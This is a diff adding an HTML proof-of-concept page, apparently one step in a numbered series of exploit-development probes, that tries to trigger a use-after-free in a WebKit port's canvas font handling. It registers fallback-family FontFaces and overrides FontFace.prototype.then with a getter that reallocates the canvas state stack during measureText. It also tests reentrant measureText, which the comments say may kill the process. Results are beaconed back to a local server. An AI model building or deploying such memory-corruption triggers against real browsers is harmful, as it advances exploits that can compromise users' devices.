@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V938</title></head>
+<body><pre id="out">V938 - FontProxy UAF via script-fallback face consult INSIDE metrics: faces named as CJK/emoji fallback families, all backed by local('SST') (known to load sync)</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(t,d){
+  try{var x=new XMLHttpRequest();x.open('GET','/beacon/V938-'+t+'?d='+encodeURIComponent(String(d===undefined?'':d).slice(0,700))+'&t='+Date.now(),false);x.send(null);}catch(e){}
+  O.textContent+='\n'+t+' '+(d===undefined?'':d);
+}
+
+/*
+ * v937 established: eager realization (load settles at ctx.font=, S2 getter
+ * fired there and survived = no stale pointer at that point), generic-family
+ * fallback face never consulted. Remaining path: WebKit's per-script
+ * fallback resolution (CSSFontSelector::fallbackFontFamily(script)) consults
+ * SPECIFIC family names at glyph-metrics time. If a FontFaceSet face exists
+ * under such a family name, its load starts INSIDE metricsOfPrimaryFont -
+ * sync local() load settles inline (S2-proven mechanics) - the getter fires
+ * inside measureText while the raw FontProxy* is live: 18 saves realloc the
+ * state stack, FontProxy freed under the running metrics. UAF.
+ *
+ * All sweep faces use src local('SST') so a match ALWAYS loads (SST proven
+ * to exist and load synchronously). Family names are the CJK/emoji fallback
+ * candidates. Status flips unloaded->loaded without any explicit font-set
+ * prove which families the script-fallback path consults on this port.
+ *
+ * LAST SECTION (R): reentrancy - getter calls ctx.measureText reentrantly
+ * during the font-set settle, inside the mid-initialization setter. New bug
+ * shape, not the documented one; runs last because it may kill the process.
+ */
+
+var FB=['Yu Gothic','Meiryo','MS Gothic','MS PGothic','Hiragino Sans','Hiragino',
+  'SST JP','SST-JP','SSTJP','SST Japanese','Malgun Gothic','Apple SD Gothic Neo',
+  'PingFang SC','Microsoft YaHei','SimHei','Noto Sans CJK JP','Droid Sans Fallback',
+  'YuMincho','Osaka','VL PGothic','IPAGothic','NanumGothic','WenQuanYi Micro Hei',
+  'AR PL UMing','Apple Color Emoji','Noto Color Emoji','Segoe UI Emoji'];
+
+var faces={};
+try{
+  for(var i=0;i<FB.length;i++){
+    try{
+      var f=new FontFace(FB[i],'local(\'SST\')');
+      f.loaded;
+      document.fonts.add(f);
+      faces[FB[i]]=f;
+    }catch(e){ bk('ADD-ERR',FB[i]+' '+String(e)); }
+  }
+  bk('ADDED','n='+Object.keys(faces).length+' all status=unloaded expected');
+}catch(e){ bk('ADD-throw',String(e)); }
+
+/* primary context, heap-backed, primary font realized eagerly (S1 law) */
+var ctx=null, primaryFace=null;
+try{
+  primaryFace=new FontFace('V1F','local(\'SST\')'); primaryFace.loaded;
+  document.fonts.add(primaryFace);
+  ctx=document.createElement('canvas').getContext('2d');
+  ctx.save(); ctx.lineWidth=0.5;
+  ctx.font='10px V1F';
+  bk('PRIMARY','status='+primaryFace.status+' (eager, expected loaded)');
+}catch(e){ bk('PRIMARY-throw',String(e)); }
+
+/* single-fire getter: 18 saves on the SAME context whose FontProxy is live */
+var fired=0;
+try{
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      fired++;
+      if(fired>1) return undefined;
+      bk('F','GETTER FIRED inside window (fire#'+fired+')');
+      for(var j=0;j<18;j++){ try{ ctx.save(); ctx.lineWidth=1+j; }catch(e){ bk('save-err',j+' '+String(e)); break; } }
+      bk('G','18 saves done');
+      return undefined;
+    }
+  });
+}catch(e){ bk('DEF-throw',String(e)); }
+
+/* the trigger: glyphs the primary font does not cover */
+function statuses(){
+  var o=[];
+  for(var k in faces){ if(faces[k].status!=='unloaded'){ o.push(k+'='+faces[k].status); } }
+  return o.length?o.join(','):'none-flipped';
+}
+try{ var w1=ctx.measureText('\u4E2D\u4E2D\u4E2D'); bk('CJK','w='+w1.width+' fired='+fired+' flipped='+statuses()); }
+catch(e){ bk('CJK-throw',String(e)); }
+try{ var w2=ctx.measureText('\uD83D\uDE00\uD83D\uDE00'); bk('EMOJI','w='+w2.width+' fired='+fired+' flipped='+statuses()); }
+catch(e){ bk('EMOJI-throw',String(e)); }
+try{ var w3=ctx.measureText('\u0645\u0631\u062D\u0628\u0627'); bk('ARABIC','w='+w3.width+' fired='+fired+' flipped='+statuses()); }
+catch(e){ bk('ARABIC-throw',String(e)); }
+
+try{ delete FontFace.prototype.then; }catch(e){}
+bk('SWEEP-DONE','fired='+fired+' flipped='+statuses());
+
+/* R: reentrant measureText during font-set settle (LAST - may kill) */
+try{
+  var ctxR=document.createElement('canvas').getContext('2d');
+  ctxR.save(); ctxR.lineWidth=0.5;
+  var fR=new FontFace('VRF','local(\'Arial\')'); fR.loaded;
+  document.fonts.add(fR);
+  var rFired=0;
+  Object.defineProperty(FontFace.prototype,'then',{
+    configurable:true,
+    get:function(){
+      rFired++;
+      if(rFired>1) return undefined;
+      bk('R-F','reentrancy getter fired during font-set; calling ctx.measureText reentrantly');
+      try{ var rw=ctxR.measureText('x'); bk('R-MT','reentrant measureText returned w='+rw.width); }
+      catch(e){ bk('R-MT-throw',String(e)); }
+      return undefined;
+    }
+  });
+  ctxR.font='10px VRF';
+  bk('R','font-set done rFired='+rFired+' status='+fR.status);
+  delete FontFace.prototype.then;
+}catch(e){ bk('R-throw',String(e)); }
+
+bk('DONE','script end');
+</script></body></html>
